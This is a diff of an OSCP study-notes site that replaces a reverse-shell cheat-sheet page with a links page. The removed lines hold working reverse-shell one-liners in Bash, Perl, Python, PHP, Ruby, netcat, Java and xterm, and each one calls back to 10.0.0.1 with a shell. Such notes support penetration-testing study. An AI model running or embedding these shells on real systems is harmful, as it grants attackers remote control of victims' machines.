@@ -6,9 +6,9 @@
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
         
         <meta name="author" content="Daniel Britt">
-        <link rel="canonical" href="https://daniel-britt.github.io/OSCP-Notes/shells/">
+        <link rel="canonical" href="https://daniel-britt.github.io/OSCP-Notes/useful links/">
         <link rel="shortcut icon" href="../img/favicon.ico">
-        <title>Shells - OSCP Notes</title>
+        <title>Useful Links - OSCP Notes</title>
         <link href="../css/bootstrap-custom.min.css" rel="stylesheet">
         <link href="../css/font-awesome.min.css" rel="stylesheet">
         <link href="../css/base.css" rel="stylesheet">
@@ -46,14 +46,14 @@
                 <div class="navbar-collapse collapse">
                         <!-- Main navigation -->
                         <ul class="nav navbar-nav">
-                            <li >
-                                <a href="../useful links/">Useful Links</a>
+                            <li class="active">
+                                <a href="./">Useful Links</a>
                             </li>
                             <li >
                                 <a href="../enumeration/">Enumeration</a>
                             </li>
-                            <li class="active">
-                                <a href="./">Shells</a>
+                            <li >
+                                <a href="../shells/">Shells</a>
                             </li>
                             <li >
                                 <a href="../tools/">Tools</a>
@@ -69,13 +69,13 @@
                                 <i class="fa fa-search"></i> Search
                             </a>
                         </li>
-                            <li >
-                                <a rel="next" href="../enumeration/">
+                            <li class="disabled">
+                                <a rel="next" >
                                     <i class="fa fa-arrow-left"></i> Previous
                                 </a>
                             </li>
                             <li >
-                                <a rel="prev" href="../tools/">
+                                <a rel="prev" href="../enumeration/">
                                     Next <i class="fa fa-arrow-right"></i>
                                 </a>
                             </li>
@@ -87,75 +87,29 @@
         <div class="container">
                 <div class="col-md-3"><div class="bs-sidebar hidden-print affix well" role="complementary">
     <ul class="nav bs-sidenav">
-        <li class="main active"><a href="#bash">Bash</a></li>
-        <li class="main "><a href="#perl">Perl</a></li>
-        <li class="main "><a href="#python">Python</a></li>
-        <li class="main "><a href="#php">PHP</a></li>
-        <li class="main "><a href="#ruby">Ruby</a></li>
-        <li class="main "><a href="#netcat">Netcat</a></li>
-        <li class="main "><a href="#java">Java</a></li>
-        <li class="main "><a href="#xterm">xterm</a></li>
+        <li class="main active"><a href="#reddit">Reddit</a></li>
+        <li class="main "><a href="#blogs">Blogs</a></li>
+        <li class="main "><a href="#techniques">Techniques</a></li>
     </ul>
 </div></div>
                 <div class="col-md-9" role="main">
 
-<h2 id="bash">Bash</h2>
-<hr />
-<pre><code>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1
-</code></pre>
-
-<h2 id="perl">Perl</h2>
-<hr />
-<pre><code>perl -e 'use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};'
-</code></pre>
-
-<h2 id="python">Python</h2>
-<hr />
-<pre><code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'
-</code></pre>
-
-<h2 id="php">PHP</h2>
-<hr />
-<pre><code>php -r '$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'
-</code></pre>
-
-<h2 id="ruby">Ruby</h2>
-<hr />
-<pre><code>ruby -rsocket -e'f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)'
-</code></pre>
-
-<h2 id="netcat">Netcat</h2>
-<hr />
-<pre><code>nc -e /bin/sh 10.0.0.1 1234
-</code></pre>
-
-<pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f
-</code></pre>
-
-<h2 id="java">Java</h2>
-<hr />
-<pre><code>r = Runtime.getRuntime()
-p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])
-p.waitFor()
-</code></pre>
-
-<h2 id="xterm">xterm</h2>
-<hr />
-<p>One of the simplest forms of reverse shell is an xterm session.  The following command should be run on the server.  It will try to connect back to you (10.0.0.1) on TCP port 6001.</p>
-<pre><code>xterm -display 10.0.0.1:1
-</code></pre>
-
-<p>To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001).  One way to do this is with Xnest (to be run on your system):</p>
-<pre><code>Xnest :1
-</code></pre>
-
-<p>You’ll need to authorise the target to connect to you (command also run on your host):</p>
-<pre><code>xhost +targetip
-</code></pre>
-
-<p><br>
-<br>
-Most of these are directly copied from <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">pentestmonkey</a></p></div>
+<h3 id="reddit">Reddit</h3>
+<ul>
+<li><a href="https://www.reddit.com/r/oscp/">https://www.reddit.com/r/oscp/</a></li>
+</ul>
+<h3 id="blogs">Blogs</h3>
+<ul>
+<li><a href="https://highon.coffee/">https://highon.coffee/</a></li>
+<li><a href="https://www.gnucitizen.org/">https://www.gnucitizen.org/</a></li>
+</ul>
+<h3 id="_1"></h3>
+<h3 id="techniques">Techniques</h3>
+<ul>
+<li><a href="https://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html">https://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html</a></li>
+<li><a href="https://netsec.ws/">https://netsec.ws/</a></li>
+<li><a href="http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</a></li>
+</ul></div>
         </div>
 
         <footer class="col-md-12">
